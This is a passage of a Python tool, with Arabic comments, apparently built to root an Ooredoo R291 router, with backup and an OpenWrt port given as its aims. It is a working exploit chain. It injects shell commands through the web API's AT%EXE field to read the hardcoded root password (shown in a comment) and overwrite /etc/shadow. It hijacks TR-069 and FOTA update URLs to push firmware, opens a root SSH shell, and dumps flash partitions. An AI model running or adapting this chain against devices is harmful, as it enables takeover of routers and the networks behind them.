        log("[!] tr069_set_info فشل أو رُفض — نجرب الطريقة (ب) عبر تعديل نسخة الإعدادات...")
        res = config_restore_arm(acs_url, interval=args.interval)
        log(f"[*] نتيجة restore_config: {res}")
        if res.get("success"):
            log("[+] ارفع يديك عن التبديل — أعد تشغيل الراوتر ثم شغّل: "
                "python3 acs_tr069.py serve --wait 120")
    else:
        log("[+] تم. الآن شغّل: python3 acs_tr069.py serve --wait 120")
        log("    إن لم يصل Inform خلال المهلة، أعد تشغيل الراوتر، "
            "أو إن كان LTE هو default route استخدم --url مع نفق عام.")


def _jobs_from_args(args) -> List[str]:
    """بناء طابور RPCs من خيارات سطر الأوامر (تُرسل بعد أول Inform)."""
    jobs: List[str] = []

    if args.probe:
        jobs.append(soap_get_rpc_methods())
        jobs.append(soap_get_parameter_names("Device."))
        jobs.append(soap_get_parameter_names("InternetGatewayDevice."))
        jobs.append(soap_get_parameter_values(["Device.", "InternetGatewayDevice."]))

    for kv in args.setparam or []:
        if "=" not in kv:
            log(f"[-] تجاهل --setparam غير صالح: {kv}")
            continue
        k, v = kv.split("=", 1)
        jobs.append(soap_set_parameter_values([(k, "string", v)]))

    if args.cwmp_enable:
        jobs.append(soap_set_parameter_values([
            ("Device.ManagementServer.EnableCWMP", "boolean", "1"),
            ("Device.ManagementServer.PeriodicInformEnable", "boolean", "1"),
            ("Device.ManagementServer.PeriodicInformInterval", "unsignedInt",
             str(args.interval)),
        ]))

    if args.download:
        ft = "1 Firmware Upgrade Image" if args.filetype == 1 else "1 Vendor Configuration File"
        target = args.target or ("/tmp/upgrade.bin" if args.filetype == 1 else "/tmp/mtk_cfg.tar.gz")
        ip = local_ip()
        url = f"http://{ip}:{args.files_port}/{os.path.basename(args.download)}"
        size = os.path.getsize(args.download)
        jobs.append(soap_download(f"r291-{int(time.time())}", ft, url, size, target,
                                  success_url=f"http://{ip}:{args.acs_port}/ok",
                                  failure_url=f"http://{ip}:{args.acs_port}/fail"))
        log(f"[*] طابور Download: FileType='{ft}' -> {url} ({size} بايت) إلى {target}")
    return jobs


def cmd_serve(args):
    start_acs(args.acs_port)
    if args.download:
        start_fileserver(os.path.dirname(os.path.abspath(args.download)), args.files_port)
    jobs = _jobs_from_args(args)

    def auto_pilot():
        # ننتظر أول اتصال Inform ثم نضع RPCs في الطابور
        while STATE["device"] is None:
            time.sleep(1)
        if jobs:
            log(f"[*] وصل أول Inform — سأضع {len(jobs)} RPC(s) في الطابور")
            for j in jobs:
                enqueue_rpc(j)

    threading.Thread(target=auto_pilot, daemon=True).start()
    log(f"[*] بانتظار اتصال الراوتر... (Ctrl+C للخروج، أو --wait {args.wait} ثانية)")
    log(f"[*] راقب الحالة من المتصفح: http://{local_ip()}:{args.acs_port}/")
    try:
        time.sleep(args.wait if args.wait and args.wait > 0 else 1e9)
    except KeyboardInterrupt:
        pass
    log("[*] جلسة المراقبة انتهت. سجل Inform الأول: " +
        f"{LOG_DIR}/inform_params.txt (إن وُجد)")


def cmd_fota(args):
    load_fota_response(args.config)
    start_fota(args.fota_port)
    if args.arm_restore:
        ensure_login()
        url = f"http://{local_ip()}:{args.fota_port}/openacs-client/inter/fotaUpgrade?"
        log(f"[*] تعديل /etc/config/ota عبر restore_config (fota_upgrade_url={url})")
        res = config_restore_arm(url, interval=args.interval)
        log(f"[*] النتيجة: {res}")
        if res.get("success"):
            log("[+] أعد تشغيل الراوتر؛ وسيحاول ota الاتصال بخادمنا في التوقيت المحدد "
                "(crontab: كل يوم 00:00/00:30/01:00/02:00)")
    log(f"[*] بانتظار طلبات FOTA... (Ctrl+C للخروج)")
    try:
        time.sleep(1e9)
    except KeyboardInterrupt:
        pass


def cmd_ota_probe(args):
    ensure_login()
    ota_probe()


# =====================================================================
# Part 6 — shell root عبر SSH (المسار الفعّال الآن)
# =====================================================================
# ملخص المسار المكتمل الذي ضبطناه تجريبياً على هذا الجهاز:
#   - كلمة مرور الجذر = قيمة متغيّر البيئة U-Boot `dropbear_password`
#     (في هذا الجهاز = 19222019). change_ssh_key.sh يكتبها مهروسة بـ
#     salt 123456 إلى /etc/shadow عند إقلاع dropbear.
#   - تسجيل الدخول يحتاج ssh مع kex القديم (diffie-hellman-group1-sha1)
#     لأن dropbear 2016.74 لا يدعم الكيك المفضل لدى OpenSSH الحديث.
#   - OpenSSH + sshpass **يعمل بصحة** إذا أضفت الـ flags الصحيحة؛ أثبت خلاطة:
#     sshpass -p '19222019' ssh -o PreferredAuthentications=password \
#        -o KexAlgorithms=diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa \
#        root@192.168.1.1 id    -> uid=0(root)
#    (الملاحظة القديمة "sshpass يرفض المصادقة" كانت ناتج غياب الـ flags في المسار
#     القديم؛ paramiko يُرسلها تلقائياً، لذا استُخدم كبديل.)



def discover_root_password():
    """قراءة `dropbear_password` من U-Boot env على الراوتر عبر %EXE -> /etc/config ثم رفع النسخة."""
    if not ensure_login():
        return None
    fname = "_pwx_probe"
    atcmd = f'AT%EXE="fw_printenv dropbear_password > /etc/config/{fname}"'
    try:
        api_login.api_call("version", "set_atcmd_info", {"atcmd": atcmd})
    except Exception:
        pass
    time.sleep(1)
    enc, dec, work = "/tmp/_pwx.bin", "/tmp/_pwx.tar.gz", "/tmp/_pwx_x"
    if os.path.exists(work):
        _rmtree(work)
    os.makedirs(work)
    if not (_download_backup(enc) and _openssl_decrypt(enc, dec)):
        return None
    with tarfile.open(dec, "r:gz") as tar:
        tar.extractall(work)
    p = os.path.join(work, "etc/config", fname)
    val = None
    if os.path.exists(p):
        txt = open(p).read()
        m = re.search(r"dropbear_password=(\S+)", txt)
        val = m.group(1) if m else txt.strip() or None
        try:
            api_login.api_call("version", "set_atcmd_info",
                               {"atcmd": f'AT%EXE="rm -f /etc/config/{fname}"'})
        except Exception:
            pass
    return val


def _rmtree(p):
    import shutil
    shutil.rmtree(p, ignore_errors=True)


def shell_root(cmd, password=None, timeout=10):
    """تنفيذ أمر شل كالجذر على الراوتر عبر paramiko + kex قديم (موثوق)."""
    try:
        import paramiko
    except ImportError:
        log("[-] paramiko غير مثبت:  pip install paramiko")
        return ""
    if password is None:
        password = discover_root_password()
    if not password:
        log("[-] لم يُكتشف dropbear_password — مرّر --password يدوياً")
        return ""
    try:
        t = paramiko.Transport((api_login.ROUTER_IP, 22))
        t._preferred_kex = ("diffie-hellman-group1-sha1",
                            "diffie-hellman-group14-sha1")
        t._preferred_keys = ("ssh-rsa",)
        t.connect(username="root", password=password)
    except Exception as e:
        log(f"[-] فشل الاتصال/المصادقة: {e}")
        return ""
    ch = t.open_session()
    ch.exec_command(cmd)
    time.sleep(0.8)
    out = b""
    while ch.recv_ready():
        out += ch.recv(8192)
    ch.close()
    t.close()
    return out.decode(errors="replace")


def _ssh_connect(password=None):
    """اتصال paramiko قديم الكيك (kex) — قابل لإعادة الاستخدام لتيار بايتات بلا حد."""
    try:
        import paramiko
    except ImportError:
        log("[-] paramiko غير مثبت:  pip install paramiko")
        return None
    if password is None:
        password = discover_root_password()
    if not password:
        log("[-] لم يُكتشف dropbear_password — مرّر --password يدوياً")
        return None
    try:
        t = paramiko.Transport((api_login.ROUTER_IP, 22))
        t._preferred_kex = ("diffie-hellman-group1-sha1",
                            "diffie-hellman-group14-sha1")
        t._preferred_keys = ("ssh-rsa",)
        t.connect(username="root", password=password)
        return t
    except Exception as e:
        log(f"[-] فشل الاتصال/المصادقة: {e}")
        return None


def cmd_backup_live(args):
    """نسخ احتياطي مباشر للراوتر إلى مجلد محلي عبر تيار بايتات SSH (بدون scp/base64).

    ينقل: التكوين الحي /etc/config — التراكم /overlay — بيانات OEM الخاصة بالوحدة
    (/NVM/oem_data) — صورة أرشيفية للكرنل والروذفك الكاشفية (kernel-a/rootfs-a)
    لاستخدامها كصورة استرداد، بالإضافة إلى سلاسل env.
    """
    import shutil
    out_dir = os.path.abspath(args.dir)
    os.makedirs(out_dir, exist_ok=True)
    # الأوامر تُرسل على النفس القناة التي تُعيد الملفات المضغوطة/الخام إلى stdout
    spec = [
        ("etc_config.tar.gz", "tar -C /etc/config -czf - .",             "config overlay (مضغوط)"),
        ("overlay.tar.gz",    "tar -C /overlay -czf - .",                "overlay UBIFS حي"),
        ("oem_data.tar.gz",   "tar -C /NVM/oem_data -czf - .",           "بيانات OEM الوحدة (MAC/ضبط)"),
        ("kernel-a.bin",      "dd if=/dev/mtd13 bs=1M 2>/dev/null",      "صورة kernel-a الكاشفية"),
        ("rootfs-a.bin",      "dd if=/dev/mtd15 bs=1M 2>/dev/null",      "صورة rootfs-a الكاشفية"),
        ("env_strings.txt",   "for p in 1 2 3 4; do echo === mtd$p ===; strings -n4 /dev/mtd$p 2>/dev/null; done",
         "سلاسل env/cal على cp_reliabledata"),
        ("opkg_probe.txt",
         "dd if=/dev/mtd15 of=/tmp/_rf.bin bs=1M 2>/tmp/_e; mkdir -p /tmp/_r; "
         "if mount -t squashfs -o loop,ro /tmp/_rf.bin /tmp/_r 2>/tmp/_me; then "
         "echo MOUNT_OK; find /tmp/_r -name opkg -type f; "
         "ls /tmp/_r/usr/lib/opkg 2>/dev/null; ls /tmp/_r/usr/bin/ | grep -iE 'opkg|wget|curl|uci'; "
         "umount /tmp/_r; else echo MOUNT_FAIL; cat /tmp/_me; fi; "
         "rm -f /tmp/_rf.bin /tmp/_e /tmp/_me; rm -rf /tmp/_r",
         "هل opkg موجود في الـ rootfs الأصلي (read-only loop)?"),
    ]
    t = _ssh_connect(password=args.password)
    if not t:
        return
    print(f"  ← تنزيل نسخة احتياطية إلى {out_dir}")
    for fname, cmd, desc in spec:
        dst = os.path.join(out_dir, fname)
        try:
            ch = t.open_session()
            ch.exec_command(cmd)
            sz = 0
            with open(dst, "wb") as fo:
                src = ch.makefile("rb")
                while True:
                    chunk = src.read(65536)
                    if not chunk:
                        break
                    fo.write(chunk)
                    sz += len(chunk)
            ch.close()
            print(f"    [+] {fname:<20} {sz:>10} bytes  # {desc}")
        except Exception as e:
            log(f"[-] {fname}: {e}")
    t.close()
    print(f"  ✅ النسخ الاحتياطي الكامل في {out_dir}")


def cmd_probe(args):
    """استخراج معلومات داخلية عميقة لعمل نسخة OpenWrt مدعومة (بدون تعديل الجهاز).

    يرسل dmesg / /proc/iomem / partitions / env MTD / MACs / عقد tty+modem
    وتحديد شريحة الـ WiFi إلى ملفات نصية داخل --dir (تدفق stdout مباشرةً).
    """
    import re
    out_dir = os.path.abspath(args.dir)
    os.makedirs(out_dir, exist_ok=True)
    # (filename, shell-command) — كل أمر يُرسل على قناة SSH ويُنقل stdout بلا حدّ
    spec = [
        ("kernel_cmdline.txt", "cat /proc/cmdline"),
        ("dmesg.txt",            "dmesg 2>&1"),
        ("proc_interrupts.txt",  "cat /proc/interrupts 2>/dev/null"),
        ("proc_iomem.txt",       "cat /proc/iomem 2>/dev/null"),
        ("proc_partitions.txt",  "cat /proc/partitions 2>/dev/null"),
        ("mtd_env_strings.txt",
         "for p in 1 2 3 4 11 21 22 23; do echo \"=== mtd$p ===\"; "
         "strings -n3 /dev/mtd$p 2>/dev/null | grep -iE '^[a-z_]{3,}=|mac|prod|key' | head -30; done"),
        ("net_mac_sources.txt",
         "echo '### ifconfig'; ifconfig -a 2>/dev/null; "
         "echo '### /sys/class/net'; ls /sys/class/net/ 2>/dev/null; "
         "for p in /sys/class/ieee80211/phy*/macaddress; do echo \"$p:\"; cat $p 2>/dev/null; done"),
        ("dev_nodes.txt",
         "echo '### /dev (serial/mtd/ubi/mmc/usb)'; "
         "ls -la /dev 2>/dev/null | grep -iE 'tty|mtd|ubi|mmc|usb|console' | head -40"),
        ("modem_wifi_dmesg.txt",
         "dmesg 2>&1 | grep -iE 'modem|qmi|wwan|ppp|cdc|ecm|tty|ath|mt76|brcm|rt2|rtl|mac80211|wireless|wifi|wl[01]' | head -60"),
        ("bootargs_txt.txt", "cat /etc/config/cmdline 2>/dev/null; echo '---bootargs-mtd---'; strings -n3 /dev/mtd21 2>/dev/null"),
    ]
    t = _ssh_connect(password=args.password)
    if not t:
        return
    print(f"  ← جمع المعلومات العميقة إلى {out_dir}")
    for fname, cmd in spec:
        dst = os.path.join(out_dir, fname)
        try:
            ch = t.open_session()
            ch.exec_command(cmd)
            sz = 0
            with open(dst, "wb") as fo:
                src = ch.makefile("rb")
                while True:
                    chunk = src.read(65536)
                    if not chunk:
                        break
                    fo.write(chunk)
                    sz += len(chunk)
            ch.close()
            print(f"    [+] {fname:<22} {sz:>8} bytes")
        except Exception as e:
            print(f"    [-] {fname}: {e}")
    t.close()
    print(f"  ✅ انتهى الاستخراج: {out_dir}")


def cmd_root_check(args):
    """توثيق الوصول الجذعري على الراوتر."""
    ensure_login()
    pw = discover_root_password()
    print(f"[*] dropbear_password المكتشف: {pw}")
    out = shell_root("id; grep ^root: /etc/shadow; cat /etc/config/dropbear | grep -E 'Auth|Port|Authorized'")
    print(out or "(فشل التنفيذ)")
    if out and "uid=0" in out:
        log("[+] تم التوثيق: shell root نشط ✅")
    else:
        log("[-] التوثيق فشل — جرّب --password يدوياً أو راجع الـ kex")


def set_root_password(new_password: str) -> bool:
    """ضبط كلمة مرور root الجديدة على الراوتر (مدى الأجهزة نفسها).

    الآلية الوثوقة التي أثبتناها:
      1) %EXE يكتب الهاش md5crypt (salt 123456) مباشرة في /etc/shadow عبر sh.
      2) fw_setenv dropbear_password  ثم change_ssh_key.sh عبر إعادة تشغيل.
    نستخدم الخطوة (1) لأنها لا تعتمد على أن يقرأ الـ daemon الـ env؛ نحن
    نكتب الـ shadow نيابةً عن change_ssh_key.sh.
    """
    ensure_login()
    import subprocess
    h = subprocess.check_output(["openssl", "passwd", "-1", "-salt", "123456",
                                 new_password], text=True).strip()
    # أمر واحد قصير — sed بـ # كمحاصر (الهاش لا يحتوي على #)
    cmd = f"sed -i 's#^root:.*#root:{h}:16804:0:99999:7:::#' /etc/shadow"
    resp = api_login.api_call("version", "set_atcmd_info",
                              {"atcmd": f'AT%EXE="{cmd}"'})
    ok = bool(resp and "setting_response" in (resp or ""))
    if ok:
        log(f"[+] كلمة مرور root ضبطتها على '{new_password}' (shadow root:$1$123456$...)")
    else:
        log(f"[-] فشل ضبط كلمة المرور: {(resp or '')[:80]}")
    return ok


def cmd_arm_root_pw(args):
    """ضبط root password على راوتر آخر + إعادة تشغيل + توثيق."""
    ensure_login()
    if not set_root_password(args.password):
        print(json.dumps({"success": False, "error": "set_root_password failed"}))
        return
    log("[*] إعادة تشغيل الراوتر...")
    api_login.api_call("router", "router_call_reboot")
    # انتظار الوعودية
    import socket
    for _ in range(90):
        try:
            socket.create_connection((api_login.ROUTER_IP, 22), 3).close()
            break
        except Exception:
            time.sleep(3)
    else:
        log("[-] لم يعد البورت 22 خلال المهلة")
    out = shell_root("id; grep ^root: /etc/shadow", password=args.password)
    print(out or "(فشل التنفيذ)")
    print(json.dumps({"success": bool(out and "uid=0" in (out or "")),
                      "password": args.password}, ensure_ascii=False, indent=2))


def main():
    p = argparse.ArgumentParser(
        prog="acs_tr069.py",
        description="وحدة مسار TR-069/FOTA لراوتر Ooredoo R291 — ACS محلي + RPCs")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("check", help="فحص شامل للراوتر (tr069/ota/dropbear/eng)")
    s.set_defaults(func=cmd_check)

    s = sub.add_parser("arm", help="توجيه CWMP إلى خادمنا (API أولاً، ثم restore)")
    s.add_argument("--url", help="عنوان ACS كاملاً (مثال نفق عام)، الافتراضي LAN IP")
    s.add_argument("--acs-port", type=int, default=ACS_PORT)
    s.add_argument("--interval", type=int, default=INFORM_INTERVAL)
    s.set_defaults(func=cmd_arm)

    s = sub.add_parser("serve", help="تشغيل خادم ACS ومراقبة Inform")
    s.add_argument("--acs-port", type=int, default=ACS_PORT)
    s.add_argument("--wait", type=int, default=300, help="ثوانٍ (0 = للأبد)")
    s.add_argument("--probe", action="store_true", help="بعد أول Inform: GetRPCMethods + GetParameterValues")
    s.add_argument("--setparam", action="append", metavar="NAME=VALUE",
                   help="SetParameterValues (قابل للتكرار)")
    s.add_argument("--cwmp-enable", action="store_true",
                   help="تفعيل Device.ManagementServer.* (EnableCWMP/URL/PeriodicInform)")
    s.add_argument("--interval", type=int, default=INFORM_INTERVAL)
    s.add_argument("--download", metavar="FILE", help="إرسال أمر Download لملف بعد أول Inform")
    s.add_argument("--filetype", type=int, default=1, choices=[1, 3],
                   help="1 = Firmware Upgrade Image، 3 = Vendor Configuration File")
    s.add_argument("--target", help="TargetFileName على الراوتر")
    s.add_argument("--files-port", type=int, default=FILES_PORT)
    s.set_defaults(func=cmd_serve)

    s = sub.add_parser("download", help="اختصار: serve --download (firmware أو vendor config)")
    s.add_argument("file", help="الملف المطلوب تحميله إلى الراوتر")
    s.add_argument("--filetype", type=int, default=1, choices=[1, 3])
    s.add_argument("--target")
    s.add_argument("--acs-port", type=int, default=ACS_PORT)
    s.add_argument("--files-port", type=int, default=FILES_PORT)
    s.add_argument("--wait", type=int, default=300)
    s.set_defaults(func=lambda a: cmd_serve(argparse.Namespace(
        acs_port=a.acs_port, files_port=a.files_port, wait=a.wait,
        probe=False, setparam=None, cwmp_enable=False, interval=INFORM_INTERVAL,
        download=a.file, filetype=a.filetype, target=a.target)))

    s = sub.add_parser("fota", help="تشغيل خادم FOTA (JSON) — مسار احتياطي")
    s.add_argument("--fota-port", type=int, default=FOTA_PORT)
    s.add_argument("--config", help="ملف JSON يحدد رد خادم FOTA (fota_response.json)")
    s.add_argument("--arm-restore", action="store_true",
                   help="تعديل /etc/config/ota في الراوتر عبر restore_config")
    s.add_argument("--interval", type=int, default=INFORM_INTERVAL)
    s.set_defaults(func=cmd_fota)

    s = sub.add_parser("ota-probe", help="تجربة أوامر قراءة على كائن ota")
    s.set_defaults(func=cmd_ota_probe)

    s = sub.add_parser("root-check", help="اكتشاف dropbear_password وتوثيق الوصول الجذعري")
    s.set_defaults(func=cmd_root_check)

    s = sub.add_parser("root-shell", help="تشغيل أمر شل كالجذر (paramiko + kex قديم)")
    s.add_argument("--command", default="id", help="الأمر (افتراضيًا id)")
    s.add_argument("--password", help="كلمة مرور يدوياً (تجاوز الكتشاف)")
    s.add_argument("--timeout", type=int, default=10, help="مهلة القراءة بالثواني (افتراضيًا 10)")
    s.add_argument("--discover-pw", action="store_true", help="أظهر الكلمة المكتشفة فقط")
    s.set_defaults(func=lambda a: (print(f"[*] dropbear_password المكتشف: {discover_root_password()}")
                                     if a.discover_pw else print(
                                         shell_root(a.command, password=a.password, timeout=a.timeout))))

    s = sub.add_parser("arm-root-pw", help="ضبط كلمة مرور root جديدة على راوتر آخر + reboot")
    s.add_argument("--password", default="R291root2026",
                   help="كلمة السر الجديدة (افتراضيًا R291root2026)")
    s.set_defaults(func=cmd_arm_root_pw)

    s = sub.add_parser("backup-live", help="نسخ احتياطي مباشر للراوتر (config/overlay/oem/kernel/rootfs/env)")
    s.add_argument("--dir", default="../../ooredoo_backup",
                   help="مجلد الوجهة المحلي (افتراضيًا ../ooredoo_backup)")
    s.add_argument("--password", help="كلمة مرور يدوياً (تجاوز الكتشاف)")
    s.set_defaults(func=cmd_backup_live)

    s = sub.add_parser("probe", help="استخراج معلومات داخلية عميقة (dmesg/iomem/env/مودم/WiFi)")
    s.add_argument("--dir", default="../../ooredoo_backup/probe",
                   help="مجلد الوجهة المحلي (افتراضيًا ../ooredoo_backup/probe)")
    s.add_argument("--password", help="كلمة مرور يدوياً (تجاوز الكتشاف)")
    s.set_defaults(func=cmd_probe)

    args = p.parse_args()
    args.func(args)



if __name__ == "__main__":
    main()
